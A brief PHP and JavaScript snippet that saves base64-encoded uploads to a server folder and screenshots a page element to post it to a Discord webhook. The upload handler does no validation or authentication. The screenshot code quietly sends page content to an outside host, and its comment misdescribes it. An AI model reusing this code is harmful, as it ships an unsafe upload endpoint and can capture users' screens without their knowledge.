
<?php
    $img = $_POST['image'];
    $folderPath = "upload/";
  
    $image_parts = explode(";base64,", $img);
    $image_type_aux = explode("image/", $image_parts[0]);
    $image_type = $image_type_aux[1];
  
    $image_base64 = base64_decode($image_parts[1]);

    $fileName = uniqid() . '.png';
  
    $file = $folderPath . $fileName;
    file_put_contents($file, $image_base64);
  
$json_pretty = json_encode($fileName, JSON_PRETTY_PRINT);
echo "<pre>" . $json_pretty . "<pre/>";
?>
<script>
//Generate Hash and send it thought a webhook
const whurl = "https://discord.com/api/webhooks/uwu";

html2canvas(screenshotTarget).then((canvas) => {
    const base64image = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");

    const msg = {

        "embeds": [{
                "image": {
                    "url": base64image
                }
            }
        ]
    }

    fetch(whurl + "?wait=true", {
        "method": "POST",
        "headers": {
            "content-type": "application/json"
        },
        "body": JSON.stringify(msg)
    })
    .then(a => a.json()).then()
});
</script>
